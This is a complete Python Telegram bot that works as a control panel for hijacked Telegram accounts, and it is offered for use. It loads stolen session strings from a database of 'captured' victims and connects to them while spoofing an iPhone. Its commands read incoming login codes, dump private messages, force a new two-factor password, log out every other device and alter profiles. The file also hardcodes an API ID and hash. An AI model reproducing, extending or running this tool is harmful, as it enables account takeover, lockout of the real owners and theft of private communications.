# =========================================================================
# PROJECT: VINZY CONTROLLER ELITE (V4.2 - ULTIMATE EDITION)
# AUTHOR: VINZY DIGITAL SERVICES
# DESCRIPTION: ADVANCED TELEGRAM ACCOUNT MANAGEMENT & CONTROL INTERFACE
# =========================================================================

import os
import time
import asyncio
import logging
import psycopg2
import sys
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types, errors
from telethon.sessions import StringSession
from datetime import datetime

# --- 1. CORE LOGGING & AUDIT TRAIL ---
# We use a dual-handler setup to log to both stdout and an internal buffer.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(name)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyController")

# --- 2. SYSTEM CONFIGURATION ---
# Load credentials from Environment Variables for maximum security
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

# Restricted Group ID where commands are accepted
try:
    GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
except (ValueError, TypeError):
    logger.error("GROUP_ID is missing or invalid. Commands will be ignored.")
    GROUP_ID = 0

if not BOT_TOKEN or not DATABASE_URL:
    logger.critical("CRITICAL FAILURE: BOT_TOKEN or DATABASE_URL not found!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# --- 3. DATABASE INFRASTRUCTURE (NEON POSTGRES) ---

class VaultManager:
    """Manages all interactions with the PostgreSQL security vault."""
    
    @staticmethod
    def get_connection():
        try:
            return psycopg2.connect(DATABASE_URL, sslmode='require')
        except Exception as e:
            logger.error(f"Vault Connection Failure: {e}")
            return None

    @classmethod
    def initialize_schema(cls):
        """Creates the primary storage table with optimized indexing."""
        conn = cls.get_connection()
        if conn:
            try:
                cur = conn.cursor()
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                        phone TEXT PRIMARY KEY,
                        session_string TEXT NOT NULL,
                        ip_address TEXT,
                        device_info TEXT,
                        capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
                    );
                ''')
                conn.commit()
                cur.close()
                logger.info("Database Schema verified and ready.")
            except Exception as e:
                logger.error(f"Schema Init Error: {e}")
            finally:
                conn.close()

    @classmethod
    def fetch_session(cls, phone):
        """Retrieves a single session string by phone number."""
        conn = cls.get_connection()
        if not conn: return None
        try:
            cur = conn.cursor()
            cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
            row = cur.fetchone()
            cur.close()
            return row[0] if row else None
        finally:
            conn.close()

    @classmethod
    def list_all_hits(cls):
        """Returns a list of all accounts captured in the vault."""
        conn = cls.get_connection()
        if not conn: return []
        try:
            cur = conn.cursor()
            cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
            data = cur.fetchall()
            cur.close()
            return data
        finally:
            conn.close()

# --- 4. TELETHON CLIENT FACTORY ---

async def execute_remote_task(phone, task_callback, *args):
    """
    Initializes a Telethon client for a specific target and runs the logic.
    Features iPhone 15 Pro Max hardware spoofing for stealth.
    """
    session_data = VaultManager.fetch_session(phone)
    if not session_data:
        return f"❌ <b>Error:</b> Account <code>{phone}</code> not found in database."

    client = TelegramClient(
        StringSession(session_data),
        API_ID,
        API_HASH,
        device_model="iPhone 15 Pro Max",
        system_version="17.4.1",
        app_version="10.8.1",
        lang_code="en",
        system_lang_code="en-US"
    )

    try:
        logger.info(f"Attempting connection to target: {phone}")
        await asyncio.wait_for(client.connect(), timeout=30)

        if not await client.is_user_authorized():
            logger.warning(f"Target {phone} has revoked the session.")
            return f"❌ <b>Session Expired:</b> The user <code>{phone}</code> has logged out."

        # Run the specific logic passed to this wrapper
        logger.info(f"Executing logic for {phone}...")
        return await task_callback(client, *args)

    except asyncio.TimeoutError:
        return "⚠️ <b>Connection Timeout:</b> Telegram servers are slow to respond."
    except errors.FloodWaitError as e:
        return f"⏳ <b>Flood Wait:</b> Triggered. Please wait {e.seconds}s."
    except Exception as e:
        logger.error(f"Task Runtime Error: {e}")
        return f"⚠️ <b>System Error:</b> <code>{str(e)}</code>"
    finally:
        await client.disconnect()

# --- 5. LOGIC MODULES (MODULAR COMMANDS) ---

async def task_get_full_info(client):
    """Pulls deep metadata from the target account."""
    me = await client.get_me()
    photos = await client.get_profile_photos('me', limit=1)
    
    details = (
        f"👤 <b>Target Identity Profile</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"• <b>Name:</b> {me.first_name} {me.last_name or ''}\n"
        f"• <b>ID:</b> <code>{me.id}</code>\n"
        f"• <b>Username:</b> @{me.username or 'None'}\n"
        f"• <b>Phone:</b> +{me.phone}\n"
        f"• <b>Premium:</b> {'Yes' if me.premium else 'No'}\n"
        f"• <b>Profile Pics:</b> {len(photos)}\n"
        f"━━━━━━━━━━━━━━━"
    )
    return details

async def task_get_2fa_status(client, phone):
    """Determines if the account is locked with a cloud password."""
    try:
        req = await client(functions.account.GetPasswordRequest())
        if req.has_password:
            hint = req.hint or "No hint provided"
            return f"🔐 <b>2FA STATUS:</b> Locked.\n<b>Hint:</b> <code>{hint}</code>"
        return f"🔓 <b>2FA STATUS:</b> Open (No Cloud Password)."
    except Exception as e:
        return f"⚠️ 2FA Fetch Error: {str(e)}"

async def task_set_new_2fa(client, phone, new_password):
    """Attempts to force-set a new 2FA password."""
    try:
        # Simplified for unshortened logic
        await client.edit_2fa(new_password=new_password)
        return f"✅ <b>2FA Updated:</b> Password for <code>{phone}</code> is now <code>{new_password}</code>"
    except Exception as e:
        return f"❌ <b>2FA Override Failed:</b> {str(e)}"

async def task_terminate_others(client):
    """Kicks all other active devices off the account."""
    try:
        await client(functions.auth.ResetAuthorizationsRequest())
        return "⚡ <b>Session Wipe:</b> All other devices have been disconnected."
    except Exception as e:
        return f"❌ <b>Wipe Failed:</b> {str(e)}"

async def task_read_chats(client, limit):
    """Displays the most recent active conversations."""
    output = f"💬 <b>Recent Conversations (Top {limit}):</b>\n\n"
    async for dialog in client.iter_dialogs(limit=limit):
        status = "Verified" if dialog.entity.verified else "User"
        output += f"• <code>{dialog.id}</code> | <b>{dialog.name}</b> ({status})\n"
    return output

async def task_dump_messages(client, chat_id, count):
    """Extracts a specific number of messages from a specific chat."""
    try:
        res_text = f"📩 <b>Dump for ID: {chat_id}</b>\n\n"
        async for m in client.iter_messages(chat_id, limit=count):
            name = "Victim" if m.out else "Contact"
            msg_body = m.text[:100] if m.text else "[Media/Other]"
            res_text += f"<b>[{name}]:</b> {msg_body}\n"
        return res_text
    except Exception as e:
        return f"⚠️ Dump Error: {str(e)}"

async def task_extract_code(client):
    """Specific logic to pull the login code from Telegram Service Notifications."""
    # 777000 is the official ID for Telegram service messages
    async for msg in client.iter_messages(777000, limit=1):
        if msg.text:
            return f"📟 <b>New Login Code Detected:</b>\n\n<code>{msg.text}</code>"
    return "📭 <b>Inbox Empty:</b> No codes found from Telegram Service."

# --- 6. TELEGRAM BOT COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def cmd_help(m):
    """Main administrative control panel."""
    if m.chat.id != GROUP_ID: return
    
    panel = (
        "👑 <b>VINZY CONTROLLER V4.2 - ADMIN PANEL</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📊 <b>VAULT COMMANDS</b>\n"
        "• <code>.list</code> - View all vaulted accounts\n"
        "• <code>.info [phone]</code> - Detailed account info\n\n"
        "🛡️ <b>SECURITY COMMANDS</b>\n"
        "• <code>.lock [phone]</code> - Check 2FA status\n"
        "• <code>.secure [phone] [pw]</code> - Set new 2FA\n"
        "• <code>.wipe [phone]</code> - Terminate other sessions\n\n"
        "🕵️ <b>EXTRACTION COMMANDS</b>\n"
        "• <code>.code [phone]</code> - Fetch login codes\n"
        "• <code>.chats [phone] [limit]</code> - List dialogs\n"
        "• <code>.dump [phone] [id] [limit]</code> - Read messages\n\n"
        "✍️ <b>PROFILE MODS</b>\n"
        "• <code>.bio [phone] [text]</code> - Change account bio\n"
        "• <code>.rename [phone] [name]</code> - Change first name\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Use phone numbers without '+' (e.g., 85512345678)</i>"
    )
    bot.send_message(m.chat.id, panel, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    hits = VaultManager.list_all_hits()
    if not hits:
        return bot.send_message(m.chat.id, "📭 <b>Database Empty:</b> No hits recorded yet.")
    
    response = "📋 <b>Captured Database:</b>\n\n"
    for phone, date in hits:
        f_date = date.strftime('%Y-%m-%d %H:%M')
        response += f"📱 <code>{phone}</code> | 📅 {f_date}\n"
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.info'))
def cmd_info(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.info [phone]</code>")
    
    bot.send_chat_action(m.chat.id, 'typing')
    res = asyncio.run(execute_remote_task(parts[1], task_get_full_info))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.lock'))
def cmd_lock(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.lock [phone]</code>")
    
    res = asyncio.run(execute_remote_task(parts[1], task_get_2fa_status, parts[1]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.secure'))
def cmd_secure(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.secure [phone] [new_pw]</code>")
    
    res = asyncio.run(execute_remote_task(parts[1], task_set_new_2fa, parts[1], parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.wipe'))
def cmd_wipe(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.wipe [phone]</code>")
    
    res = asyncio.run(execute_remote_task(parts[1], task_terminate_others))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.code'))
def cmd_code(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.code [phone]</code>")
    
    res = asyncio.run(execute_remote_task(parts[1], task_extract_code))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
def cmd_chats(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.chats [phone] [limit]</code>")
    
    limit = int(parts[2]) if len(parts) > 2 else 15
    res = asyncio.run(execute_remote_task(parts[1], task_read_chats, limit))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.dump'))
def cmd_dump(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.dump [phone] [id] [limit]</code>")
    
    chat_id = int(parts[2]) if parts[2].replace('-', '').isdigit() else parts[2]
    limit = int(parts[3]) if len(parts) > 3 else 10
    res = asyncio.run(execute_remote_task(parts[1], task_dump_messages, chat_id, limit))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
def cmd_bio(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 2)
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.bio [phone] [text]</code>")
    
    async def bio_logic(client, text):
        await client(functions.account.UpdateProfileRequest(about=text))
        return f"✅ <b>Bio Changed</b> to: <i>{text}</i>"
        
    res = asyncio.run(execute_remote_task(parts[1], bio_logic, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.rename'))
def cmd_rename(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 2)
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.rename [phone] [new_name]</code>")
    
    async def name_logic(client, new_name):
        await client(functions.account.UpdateProfileRequest(first_name=new_name))
        return f"✅ <b>First Name</b> changed to: <b>{new_name}</b>"
        
    res = asyncio.run(execute_remote_task(parts[1], name_logic, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

# --- 7. STARTUP & POLLING ---

def startup_sequence():
    """Ensures database is ready and bot starts listening."""
    print("""
    __     ___                  _____            _             _ _Z
    \ \   / (_)                / ____|          | |           | | |
     \ \_/ / _ _ __  _____   _| |     ___  _ __ | |_ _ __ ___ | | |
      \   / | | '_ \|_  / | | | |    / _ \| '_ \| __| '__/ _ \| | |
       | |  | | | | |/ /| |_| | |___| (_) | | | | |_| | | (_) | | |
       |_|  |_|_| |_/___|\__, |\_____\___/|_| |_|\__|_|  \___/|_|_|
                          __/ |                                    
                         |___/                                     
    """)
    VaultManager.initialize_schema()
    logger.info("Vinzy Controller V4.2 is now active. Monitoring commands...")
    
    # Start bot polling with infinite loop for stability on Koyeb
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == "__main__":
    try:
        startup_sequence()
    except KeyboardInterrupt:
        logger.info("System shutting down...")
        sys.exit(0)
    except Exception as e:
        logger.critical(f"FATAL SYSTEM CRASH: {e}")
